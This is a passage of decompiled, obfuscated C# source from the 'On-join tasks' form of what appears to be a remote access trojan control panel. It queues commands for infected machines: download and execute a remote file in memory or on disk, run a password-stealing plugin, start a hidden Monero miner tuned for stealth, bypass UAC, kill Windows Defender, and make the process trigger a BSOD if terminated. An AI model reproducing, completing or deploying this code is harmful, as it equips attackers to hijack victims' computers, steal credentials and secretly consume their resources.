        this.vmethod_12().Name = "txtDLEXEC";
        this.vmethod_12().Size = new Size(0x135, 20);
        this.vmethod_12().TabIndex = 0x1d;
        this.vmethod_6().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_6().Controls.Add(this.vmethod_4());
        this.vmethod_6().Controls.Add(this.vmethod_2());
        this.vmethod_6().Controls.Add(this.vmethod_0());
        this.vmethod_6().Controls.Add(this.vmethod_84());
        this.vmethod_6().Controls.Add(this.vmethod_90());
        this.vmethod_6().Controls.Add(this.vmethod_94());
        this.vmethod_6().Location = new Point(1, 0x119);
        this.vmethod_6().Margin = new Padding(2);
        this.vmethod_6().Name = "tbTasks";
        this.vmethod_6().SelectedIndex = 0;
        this.vmethod_6().Size = new Size(0x377, 0x74);
        this.vmethod_6().TabIndex = 0x6f;
        this.vmethod_84().BackColor = SystemColors.AppWorkspace;
        this.vmethod_84().Controls.Add(this.vmethod_86());
        this.vmethod_84().Location = new Point(4, 0x16);
        this.vmethod_84().Name = "tbUAC";
        this.vmethod_84().Padding = new Padding(3);
        this.vmethod_84().Size = new Size(0x36f, 90);
        this.vmethod_84().TabIndex = 4;
        this.vmethod_84().Text = "UAC Elevation";
        this.vmethod_86().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_86().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_86().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_86().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_86().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_86().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_86().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_86().Border.HoverVisible = true;
        this.vmethod_86().Border.Rounding = 6;
        this.vmethod_86().Border.Thickness = 1;
        this.vmethod_86().Border.Type = ShapeTypes.Rounded;
        this.vmethod_86().Border.Visible = true;
        this.vmethod_86().DialogResult = DialogResult.None;
        this.vmethod_86().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_86().Image = null;
        this.vmethod_86().Location = new Point(0x328, 0x44);
        this.vmethod_86().MouseState = MouseStates.Normal;
        this.vmethod_86().Name = "btnUACAdd";
        this.vmethod_86().Size = new Size(0x44, 0x13);
        this.vmethod_86().TabIndex = 0x2f;
        this.vmethod_86().Text = "Add";
        this.vmethod_86().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_86().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_86().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_86().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_86().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_86().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_86().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_86().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_90().BackColor = SystemColors.AppWorkspace;
        this.vmethod_90().Controls.Add(this.vmethod_92());
        this.vmethod_90().Location = new Point(4, 0x16);
        this.vmethod_90().Name = "tbProtectProcess";
        this.vmethod_90().Padding = new Padding(3);
        this.vmethod_90().Size = new Size(0x36f, 90);
        this.vmethod_90().TabIndex = 5;
        this.vmethod_90().Text = "Protect process";
        this.vmethod_92().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_92().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_92().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_92().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_92().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_92().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_92().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_92().Border.HoverVisible = true;
        this.vmethod_92().Border.Rounding = 6;
        this.vmethod_92().Border.Thickness = 1;
        this.vmethod_92().Border.Type = ShapeTypes.Rounded;
        this.vmethod_92().Border.Visible = true;
        this.vmethod_92().DialogResult = DialogResult.None;
        this.vmethod_92().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_92().Image = null;
        this.vmethod_92().Location = new Point(0x328, 0x44);
        this.vmethod_92().MouseState = MouseStates.Normal;
        this.vmethod_92().Name = "btnPrcAdd";
        this.vmethod_92().Size = new Size(0x44, 0x13);
        this.vmethod_92().TabIndex = 0x30;
        this.vmethod_92().Text = "Add";
        this.vmethod_92().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_92().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_92().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_92().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_92().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_92().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_92().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_92().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_94().BackColor = SystemColors.AppWorkspace;
        this.vmethod_94().Controls.Add(this.vmethod_96());
        this.vmethod_94().Location = new Point(4, 0x16);
        this.vmethod_94().Name = "tbWDKill";
        this.vmethod_94().Padding = new Padding(3);
        this.vmethod_94().Size = new Size(0x36f, 90);
        this.vmethod_94().TabIndex = 6;
        this.vmethod_94().Text = "Kill Windows Defender";
        this.vmethod_96().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_96().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_96().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_96().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_96().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_96().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_96().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_96().Border.HoverVisible = true;
        this.vmethod_96().Border.Rounding = 6;
        this.vmethod_96().Border.Thickness = 1;
        this.vmethod_96().Border.Type = ShapeTypes.Rounded;
        this.vmethod_96().Border.Visible = true;
        this.vmethod_96().DialogResult = DialogResult.None;
        this.vmethod_96().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_96().Image = null;
        this.vmethod_96().Location = new Point(0x328, 0x44);
        this.vmethod_96().MouseState = MouseStates.Normal;
        this.vmethod_96().Name = "btnTBKill";
        this.vmethod_96().Size = new Size(0x44, 0x13);
        this.vmethod_96().TabIndex = 0x31;
        this.vmethod_96().Text = "Add";
        this.vmethod_96().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_96().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_96().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_96().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_96().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_96().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_96().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_96().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_70().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] toolStripItems = new ToolStripItem[] { this.vmethod_72(), this.vmethod_88(), this.vmethod_74(), this.vmethod_76() };
        this.vmethod_70().Items.AddRange(toolStripItems);
        this.vmethod_70().Name = "ContextMenuStrip1";
        this.vmethod_70().Size = new Size(170, 0x4c);
        this.vmethod_72().Name = "RemoveToolStripMenuItem";
        this.vmethod_72().Size = new Size(0xa9, 0x16);
        this.vmethod_72().Text = "Remove selected";
        this.vmethod_88().Name = "ClearToolStripMenuItem";
        this.vmethod_88().Size = new Size(0xa9, 0x16);
        this.vmethod_88().Text = "Clear";
        this.vmethod_74().Name = "ToolStripMenuItem2";
        this.vmethod_74().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray2 = new ToolStripItem[] { this.vmethod_78(), this.vmethod_80(), this.vmethod_82() };
        this.vmethod_76().DropDownItems.AddRange(itemArray2);
        this.vmethod_76().Name = "CopyToClipboardToolStripMenuItem";
        this.vmethod_76().Size = new Size(0xa9, 0x16);
        this.vmethod_76().Text = "Copy to clipboard";
        this.vmethod_78().Name = "SelectedToolStripMenuItem";
        this.vmethod_78().Size = new Size(0x76, 0x16);
        this.vmethod_78().Text = "Selected";
        this.vmethod_80().Name = "ToolStripMenuItem4";
        this.vmethod_80().Size = new Size(0x73, 6);
        this.vmethod_82().Name = "AllToolStripMenuItem";
        this.vmethod_82().Size = new Size(0x76, 0x16);
        this.vmethod_82().Text = "All";
        this.vmethod_8().Alignment = ListViewAlignment.Left;
        this.vmethod_8().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_8().AutoArrange = false;
        this.vmethod_8().BackColor = Color.White;
        this.vmethod_8().ContextMenuStrip = this.vmethod_70();
        this.vmethod_8().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_8().ForeColor = Color.Black;
        this.vmethod_8().FullRowSelect = true;
        this.vmethod_8().HideSelection = false;
        this.vmethod_8().Location = new Point(1, 1);
        this.vmethod_8().Margin = new Padding(1);
        this.vmethod_8().Name = "lvTasks";
        this.vmethod_8().Size = new Size(0x377, 0x115);
        this.vmethod_8().TabIndex = 110;
        this.vmethod_8().UseCompatibleStateImageBehavior = false;
        this.vmethod_8().View = View.Details;
        base.AutoScaleDimensions = new SizeF(6f, 13f);
        base.AutoScaleMode = AutoScaleMode.Font;
        this.BackColor = SystemColors.AppWorkspace;
        base.ClientSize = new Size(890, 0x18f);
        base.Controls.Add(this.vmethod_8());
        base.Controls.Add(this.vmethod_6());
        this.DoubleBuffered = true;
        base.FormBorderStyle = FormBorderStyle.FixedToolWindow;
        base.Name = "fOnJoin";
        base.Opacity = 0.0;
        base.ShowIcon = false;
        base.ShowInTaskbar = false;
        this.Text = "On-join tasks";
        this.vmethod_0().ResumeLayout(false);
        this.vmethod_0().PerformLayout();
        ((ISupportInitialize) this.vmethod_22()).EndInit();
        ((ISupportInitialize) this.vmethod_24()).EndInit();
        this.vmethod_2().ResumeLayout(false);
        this.vmethod_4().ResumeLayout(false);
        this.vmethod_4().PerformLayout();
        this.vmethod_6().ResumeLayout(false);
        this.vmethod_84().ResumeLayout(false);
        this.vmethod_90().ResumeLayout(false);
        this.vmethod_94().ResumeLayout(false);
        this.vmethod_70().ResumeLayout(false);
        base.ResumeLayout(false);
    }

    private void method_0(object sender, EventArgs e)
    {
        TextBox box;
        string text = (box = this.vmethod_12()).Text;
        ref string strRef = ref text;
        int num = (int) ((Operators.CompareString(this.vmethod_12().Text, string.Empty, true) == 0) | (this.vmethod_12().TextLength > 0x800));
        int num1 = (int) (false & Strings.LCase(strRef).StartsWith("https"));
        if (strRef.ToLower().StartsWith("www."))
        {
            strRef = "http://" + strRef;
        }
        bool flag = Regex.IsMatch(strRef, @"http(s)?://([\w+?\.\w+])+([a-zA-Z0-9\~\!\@\#\$\%\^\&\*\(\)_\-\=\+\\\/\?\.\:\;\'\,]*)?");
        box.Text = text;
        if ((num | !flag) != 0)
        {
            Interaction.MsgBox("Invalid URL!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            string expression = Interaction.InputBox("Enter delay in minutes (Use 0 for instant)", Application.ProductName, string.Empty, -1, -1);
            if (!Versioned.IsNumeric(expression) | (Conversion.Val(expression) > 1440.0))
            {
                Interaction.MsgBox("Invalid amount of minutes!\r\nAllowed range is 0 to 1440 minutes.", MsgBoxStyle.Exclamation, Application.ProductName);
            }
            else
            {
                ListViewItem item = new ListViewItem();
                item.Tag = Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("dlexec|", Interaction.IIf(this.vmethod_14().Checked, "0", "1")), "|"), this.vmethod_12().Text);
                item.Text = "Download & Execute";
                if (this.vmethod_14().Checked)
                {
                    item.SubItems.Add("Execute: " + this.vmethod_12().Text + " in memory");
                }
                else
                {
                    item.SubItems.Add("Execute: " + this.vmethod_12().Text + " on disk");
                }
                item.SubItems.Add(Conversions.ToString(Conversion.Val(expression)));
                item.SubItems.Add("0");
                this.vmethod_8().Items.Add(item);
                this.method_20();
            }
        }
    }

    private void method_1(object sender, EventArgs e)
    {
        if (!File.Exists(Application.StartupPath + @"\data\plugins\pws.plg"))
        {
            Interaction.MsgBox("Plugin not found! Please make sure: " + Application.StartupPath + @"\data\plugins\pws.plg exists.", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            string expression = Interaction.InputBox("Enter delay in minutes (Use 0 for instant)", Application.ProductName, string.Empty, -1, -1);
            if (!Versioned.IsNumeric(expression) | (Conversion.Val(expression) > 1440.0))
            {
                Interaction.MsgBox("Invalid amount of minutes!\r\nAllowed range is 0 to 1440 minutes.", MsgBoxStyle.Exclamation, Application.ProductName);
            }
            else
            {
                string str2 = Class136.smethod_29(ref Application.StartupPath + @"\data\plugins\pws.plg");
                Class130.fCredentialsLogins_0.Visible = true;
                ListViewItem item = new ListViewItem();
                if (Class135.smethod_0().PluginsUpload)
                {
                    item.Tag = "crd_logins_report_req|" + str2;
                    item.Text = "Password recovery";
                    item.SubItems.Add("Plugin will be uploaded");
                    item.SubItems.Add(Conversions.ToString(Conversion.Val(expression)));
                    item.SubItems.Add("0");
                }
                else
                {
                    if (((((Class135.smethod_0().PluginsURLPws.Length < 8) | !Class135.smethod_0().PluginsURLPws.Contains("://")) | !Class135.smethod_0().PluginsURLPws.Contains("http")) | !Class135.smethod_0().PluginsURLPws.Contains(".")) | (Operators.CompareString(Class135.smethod_0().PluginsURLPws, "URL to plugin: http://site.com/pws.plg", true) == 0))
                    {
                        Interaction.MsgBox("URL to plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
                        Class130.fSettings_0.Visible = true;
                        Class130.fSettings_0.Activate();
                        Class130.fSettings_0.vmethod_44().BackColor = Color.Red;
                        return;
                    }
                    item.Tag = "crd_logins_report|" + str2 + "|" + Class135.smethod_0().PluginsURLPws;
                    item.Text = "Password recovery";
                    item.SubItems.Add("Plugin will be downloaded");
                    item.SubItems.Add(Conversions.ToString(Conversion.Val(expression)));
                    item.SubItems.Add("0");
                }
                this.vmethod_8().Items.Add(item);
                this.method_20();
            }
        }
    }

    private void method_10(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_48().Text, string.Empty, true) == 0)
        {
            this.vmethod_48().Text = "(Optional)";
            this.vmethod_48().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_48().Font, FontStyle.Italic);
            this.vmethod_48().Font = font;
        }
    }

    private void method_11(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_48().Text, "(Optional)", true) == 0)
        {
            this.vmethod_48().Text = string.Empty;
            this.vmethod_48().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_48().Font, FontStyle.Regular);
            this.vmethod_48().Font = font;
        }
    }

    private void method_12(object sender, EventArgs e)
    {
        this.vmethod_62().BringToFront();
        this.vmethod_62().Width = (this.vmethod_28().Left + this.vmethod_28().Width) - this.vmethod_62().Left;
        this.vmethod_62().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        if (Operators.CompareString(this.vmethod_62().Text, "Username/wallet address", true) == 0)
        {
            this.vmethod_62().Text = string.Empty;
            this.vmethod_62().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_62().Font, FontStyle.Regular);
            this.vmethod_62().Font = font;
        }
    }

    private void method_13(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_62().Text, string.Empty, true) == 0)
        {
            this.vmethod_62().Text = "Username/wallet address";
            this.vmethod_62().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_62().Font, FontStyle.Italic);
            this.vmethod_62().Font = font;
        }
        this.vmethod_62().Width = this.vmethod_66().Width;
        this.vmethod_62().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
    }

    private void method_14(object sender, EventArgs e)
    {
        string str = string.Empty;
        string str2 = string.Empty;
        string str3 = string.Empty;
        string str4 = string.Empty;
        string str5 = string.Empty;
        string str6 = string.Empty;
        string str7 = string.Empty;
        string str8 = string.Empty;
        string str9 = string.Empty;
        object obj2 = Interaction.IIf(this.vmethod_26().Checked, Application.StartupPath + @"\data\plugins\xmr64.plg", Application.StartupPath + @"\data\plugins\xmr.plg");
        if (!File.Exists(Conversions.ToString(obj2)))
        {
            Interaction.MsgBox(Operators.ConcatenateObject(Operators.ConcatenateObject("Plugin not found! Please make sure: ", obj2), " exists."), MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else if (!Class135.smethod_0().PluginsUpload && (((((Class135.smethod_0().PluginsURLXMR.Length < 8) | !Class135.smethod_0().PluginsURLXMR.Contains("://")) | !Class135.smethod_0().PluginsURLXMR.Contains("http")) | !Class135.smethod_0().PluginsURLXMR.Contains(".")) | (Operators.CompareString(Class135.smethod_0().PluginsURLXMR, "URL to plugin: http://site.com/xmr.plg", true) == 0)))
        {
            Interaction.MsgBox("URL to XMR Miner plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
            Class130.fSettings_0.Visible = true;
            Class130.fSettings_0.Activate();
            Class130.fSettings_0.vmethod_6().SelectedIndex = 2;
            Class130.fSettings_0.vmethod_42().Select();
            Class130.fSettings_0.vmethod_42().BackColor = Color.Red;
        }
        else if (((this.vmethod_66().Text.Length < 5) | !this.vmethod_66().Text.Contains(":")) | (Operators.CompareString(this.vmethod_66().Text, "example-pool.com:5555", true) == 0))
        {
            Interaction.MsgBox("Invalid Pool/URL of mining server!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else if ((this.vmethod_62().Text.Length < 1) | (Operators.CompareString(this.vmethod_62().Text, "Username/wallet address", true) == 0))
        {
            Interaction.MsgBox("Invalid Username!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            string expression = Interaction.InputBox("Enter delay in minutes (Use 0 for instant)", Application.ProductName, string.Empty, -1, -1);
            if (!Versioned.IsNumeric(expression) | (Conversion.Val(expression) > 1440.0))
            {
                Interaction.MsgBox("Invalid amount of minutes!\r\nAllowed range is 0 to 1440 minutes.", MsgBoxStyle.Exclamation, Application.ProductName);
            }
            else
            {
                if (this.vmethod_54().SelectedIndex > 0)
                {
                    str = " --threads " + this.vmethod_54().SelectedItem.ToString();
                }
                if (this.vmethod_44().SelectedIndex > 0)
                {
                    str8 = " --donate-level=" + this.vmethod_44().SelectedItem.ToString();
                }
                if ((this.vmethod_48().Text.Length > 0) & (Operators.CompareString(this.vmethod_48().Text, "(Optional)", true) != 0))
                {
                    str3 = " -u " + this.vmethod_48().Text;
                }
                if ((this.vmethod_34().Text.Length > 0) & (Operators.CompareString(this.vmethod_34().Text, "(Optional)", true) != 0))
                {
                    str9 = " --user-agent \"" + this.vmethod_34().Text + "\"";
                }
                if ((this.vmethod_28().Text.Length > 0) & (Operators.CompareString(this.vmethod_28().Text, "(Optional)", true) != 0))
                {
                    string text = this.vmethod_28().Text;
                }
                if (this.vmethod_52().Checked)
                {
                    str4 = " --nicehash";
                }
                if (this.vmethod_42().Checked)
                {
                    str5 = " --keepalive";
                }
                if (this.vmethod_32().Checked)
                {
                    str6 = " --no-huge-pages";
                }
                str7 = " -u " + this.vmethod_62().Text;
                str2 = " -a " + this.vmethod_58().SelectedItem.ToString();
                if (this.vmethod_38().SelectedIndex != 3)
                {
                    switch (this.vmethod_38().SelectedIndex)
                    {
                        default:
                            break;
                    }
                }
                StringBuilder builder = new StringBuilder();
                byte[] buffer = MD5.Create().ComputeHash(File.ReadAllBytes(Conversions.ToString(obj2)));
                int num4 = buffer.Length - 1;
                for (int i = 0; i <= num4; i++)
                {
                    builder.Append(buffer[i].ToString("X2"));
                }
                StringBuilder builder2 = new StringBuilder();
                if (this.vmethod_26().Checked)
                {
                    byte[] buffer2 = MD5.Create().ComputeHash(File.ReadAllBytes(Application.StartupPath + @"\data\plugins\loader.plg"));
                    int num5 = buffer2.Length - 1;
                    for (int j = 0; j <= num5; j++)
                    {
                        builder2.Append(buffer2[j].ToString("X2"));
                    }
                }
                ListViewItem item = new ListViewItem();
                item.Text = "XMR Miner";
                if (!Class135.smethod_0().PluginsUpload)
                {
                    if (!this.vmethod_26().Checked)
                    {
                        string[] textArray2 = new string[0x10];
                        textArray2[0] = "xmr64_mine_start|";
                        textArray2[1] = builder.ToString().ToLower();
                        textArray2[2] = "|";
                        textArray2[3] = Class135.smethod_0().PluginsURLXMR;
                        textArray2[4] = "|";
                        textArray2[5] = str;
                        textArray2[6] = str2;
                        textArray2[7] = " -o ";
                        textArray2[8] = this.vmethod_66().Text;
                        textArray2[9] = str7;
                        textArray2[10] = str3;
                        textArray2[11] = str4;
                        textArray2[12] = str5;
                        textArray2[13] = str6;
                        textArray2[14] = str8;
                        textArray2[15] = str9;
                        item.Tag = string.Concat(textArray2);
                        item.SubItems.Add("Mining for " + this.vmethod_66().Text + " (32-bit)");
                    }
                    else
                    {
                        string[] textArray1 = new string[20];
                        textArray1[0] = "xmr64_mine_start|";
                        textArray1[1] = builder.ToString().ToLower();
                        textArray1[2] = "|";
                        textArray1[3] = Class135.smethod_0().PluginsURLXMR64;
                        textArray1[4] = "|";
                        textArray1[5] = builder2.ToString().ToLower();
                        textArray1[6] = "|";
                        textArray1[7] = Class135.smethod_0().PluginsURLLoader;
                        textArray1[8] = "|";
                        textArray1[9] = str;
                        textArray1[10] = str2;
                        textArray1[11] = " -o ";
                        textArray1[12] = this.vmethod_66().Text;
                        textArray1[13] = str7;
                        textArray1[14] = str3;
                        textArray1[15] = str4;
                        textArray1[0x10] = str5;
                        textArray1[0x11] = str6;
                        textArray1[0x12] = str8;
                        textArray1[0x13] = str9;
                        item.Tag = string.Concat(textArray1);
                        item.SubItems.Add("Mining for " + this.vmethod_66().Text + " (64-bit)");
                    }
                }
                else if (!this.vmethod_26().Checked)
                {
                    string[] textArray4 = new string[0x10];
                    textArray4[0] = "xmr64_mine_req|";
                    textArray4[1] = builder.ToString().ToLower();
                    textArray4[2] = "|";
                    textArray4[3] = Class135.smethod_0().PluginsURLXMR;
                    textArray4[4] = "|";
                    textArray4[5] = str;
                    textArray4[6] = str2;
                    textArray4[7] = " -o ";
                    textArray4[8] = this.vmethod_66().Text;
                    textArray4[9] = str7;
                    textArray4[10] = str3;
                    textArray4[11] = str4;
                    textArray4[12] = str5;
                    textArray4[13] = str6;
                    textArray4[14] = str8;
                    textArray4[15] = str9;
                    item.Tag = string.Concat(textArray4);
                    item.SubItems.Add("Mining for " + this.vmethod_66().Text + " (32-bit)");
                }
                else
                {
                    string[] textArray3 = new string[20];
                    textArray3[0] = "xmr64_mine_req|";
                    textArray3[1] = builder.ToString().ToLower();
                    textArray3[2] = "|";
                    textArray3[3] = Class135.smethod_0().PluginsURLXMR64;
                    textArray3[4] = "|";
                    textArray3[5] = builder2.ToString().ToLower();
                    textArray3[6] = "|";
                    textArray3[7] = Class135.smethod_0().PluginsURLLoader;
                    textArray3[8] = "|";
                    textArray3[9] = str;
                    textArray3[10] = str2;
                    textArray3[11] = " -o ";
                    textArray3[12] = this.vmethod_66().Text;
                    textArray3[13] = str7;
                    textArray3[14] = str3;
                    textArray3[15] = str4;
                    textArray3[0x10] = str5;
                    textArray3[0x11] = str6;
                    textArray3[0x12] = str8;
                    textArray3[0x13] = str9;
                    item.Tag = string.Concat(textArray3);
                    item.SubItems.Add("Mining for " + this.vmethod_66().Text + " (64-bit)");
                }
                item.SubItems.Add(Conversions.ToString(Conversion.Val(expression)));
                item.SubItems.Add("0");
                this.vmethod_8().Items.Add(item);
                this.method_20();
            }
        }
    }

    private void method_15(object sender, EventArgs e)
    {
        if (MessageBox.Show("Are you sure you want to remove the selected command(s)?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
        {
            GClass7 class2 = this.vmethod_8();
            while (true)
            {
                int num = class2.Items.Count - 1;
                int num2 = 0;
                while (true)
                {
                    if (num2 <= num)
                    {
                        if (!class2.Items[num2].Selected)
                        {
                            num2++;
                            continue;
                        }
                        class2.Items[num2].Remove();
                    }
                    else
                    {
                        class2 = null;
                        this.method_20();
                        break;
                    }
                    break;
                }
            }
        }
    }

    private void method_16(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        if (this.vmethod_8().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_8();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (builder.Length > 0)
                    {
                        Clipboard.Clear();
                        string text1 = builder.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                if (class2.Items[num].Selected)
                {
                    builder.Append(class2.Items[num].Text);
                    int num4 = class2.Columns.Count - 1;
                    int num2 = 1;
                    while (true)
                    {
                        if (num2 > num4)
                        {
                            builder.Append("\r\n");
                            break;
                        }
                        builder.Append("\t" + class2.Items[num].SubItems[num2].Text);
                        num2++;
                    }
                }
                num++;
            }
        }
    }

    private void method_17(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        if (this.vmethod_8().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_8();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (builder.Length > 0)
                    {
                        Clipboard.Clear();
                        string text1 = builder.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                builder.Append(class2.Items[num].Text);
                int num4 = class2.Columns.Count - 1;
                int num2 = 1;
                while (true)
                {
                    if (num2 > num4)
                    {
                        builder.Append("\r\n");
                        num++;
                        break;
                    }
                    builder.Append("\t" + class2.Items[num].SubItems[num2].Text);
                    num2++;
                }
            }
        }
    }

    private void method_18(object sender, EventArgs e)
    {
    }

    private void method_19(object sender, EventArgs e)
    {
        ListViewItem item = new ListViewItem();
        string expression = Interaction.InputBox("Enter delay in minutes (Use 0 for instant)", Application.ProductName, string.Empty, -1, -1);
        if (!Versioned.IsNumeric(expression) | (Conversion.Val(expression) > 1440.0))
        {
            Interaction.MsgBox("Invalid amount of minutes!\r\nAllowed range is 0 to 1440 minutes.", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            item.Tag = "uac_bypass|1";
            item.Text = "UAC Bypass";
            item.SubItems.Add("Attempt to gain administrative privileges by means of bypassing UAC (Exploit)");
            item.SubItems.Add(Conversions.ToString(Conversion.Val(expression)));
            item.SubItems.Add("0");
            this.vmethod_8().Items.Add(item);
            this.method_20();
        }
    }

    private void method_2(object sender, EventArgs e)
    {
        Interaction.MsgBox("It's recommended to leave the number of threads to auto, especially when mining from several clients with different PC specifications.\r\nIf auto is selected, the miner will use as many threads as possible for optimal mining performance and typically consume about 50% of CPU power in average.\r\nBy setting a value for threads, like 16, will consume about 100% from CPUs having 8 cores and cause stuttering/lag on waker CPUs.\r\nIf being stealth is more valued, then it's recommended to use a low number for threads at the cost of reduced hash rate.\r\nI.e. 2-4 threads may be prefered and should consume between 25-50% of CPU power.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_20()
    {
        ArrayList list = new ArrayList();
        GClass7 class2 = this.vmethod_8();
        int num = class2.Items.Count - 1;
        for (int i = 0; i <= num; i++)
        {
            Strings.Split(Conversions.ToString(class2.Items[i].Tag), "|", -1, CompareMethod.Text);
            string[] textArray1 = new string[] { class2.Items[i].Text, "|", class2.Items[i].SubItems[1].Text, "|", class2.Items[i].SubItems[2].Text, "|" };
            list.Add(Operators.ConcatenateObject(string.Concat(textArray1), class2.Items[i].Tag));
        }
        class2 = null;
        Class135.smethod_0().OnJoinCommands = list;
        Class135.smethod_0().Save();
    }

    private void method_21(object sender, EventArgs e)
    {
        if (MessageBox.Show("Are you sure you want clear all commands?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
        {
            this.vmethod_8().Items.Clear();
            this.method_20();
        }
    }

    private void method_22(object sender, EventArgs e)
    {
        ListViewItem item = new ListViewItem();
        string expression = Interaction.InputBox("Enter delay in minutes (Use 0 for instant)", Application.ProductName, string.Empty, -1, -1);
        if (!Versioned.IsNumeric(expression) | (Conversion.Val(expression) > 1440.0))
        {
            Interaction.MsgBox("Invalid amount of minutes!\r\nAllowed range is 0 to 1440 minutes.", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            item.Tag = "prc_protect|1";
            item.Text = "Protect process";
            item.SubItems.Add("Attempt to protect process (trigger BSOD on terminate)");
            item.SubItems.Add(Conversions.ToString(Conversion.Val(expression)));
            item.SubItems.Add("0");
            this.vmethod_8().Items.Add(item);
            this.method_20();
        }
    }

    private void method_23(object sender, EventArgs e)
    {
        ListViewItem item = new ListViewItem();
